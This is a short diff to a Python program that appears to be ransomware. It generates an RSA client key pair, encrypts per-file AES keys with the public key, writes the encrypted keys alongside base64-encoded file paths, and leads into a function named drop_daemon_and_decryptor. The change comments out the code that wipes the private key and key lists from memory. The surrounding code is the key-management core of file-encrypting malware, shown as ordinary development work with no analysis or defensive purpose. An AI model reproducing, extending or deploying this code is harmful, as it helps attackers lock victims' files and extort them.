@@ -96,11 +96,11 @@ def menu():
     with open(variables.client_public_key_path, 'wb') as f:
         f.write(Client_public_key)
 
-    Client_private_key = None
-    rsa_object = None
-    del rsa_object
-    del Client_private_key
-    gc.collect()
+    # Client_private_key = None
+    # rsa_object = None
+    # del rsa_object
+    # del Client_private_key
+    # gc.collect()
 
     client_public_key_object =  RSA.importKey(Client_public_key)
     client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
@@ -117,18 +117,18 @@ def menu():
         encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
         enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
 
-    aes_keys_and_base64_path = None
-    del aes_keys_and_base64_path
-    gc.collect()
+    # aes_keys_and_base64_path = None
+    # del aes_keys_and_base64_path
+    # gc.collect()
 
     with open(variables.aes_encrypted_keys_path, 'w') as f:
         for _ in enc_aes_key_and_base64_path:
             line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1] + "\n"
             f.write(line)
 
-    enc_aes_key_and_base64_path = None
-    del enc_aes_key_and_base64_path
-    gc.collect()
+    # enc_aes_key_and_base64_path = None
+    # del enc_aes_key_and_base64_path
+    # gc.collect()
 
 
 def drop_daemon_and_decryptor():
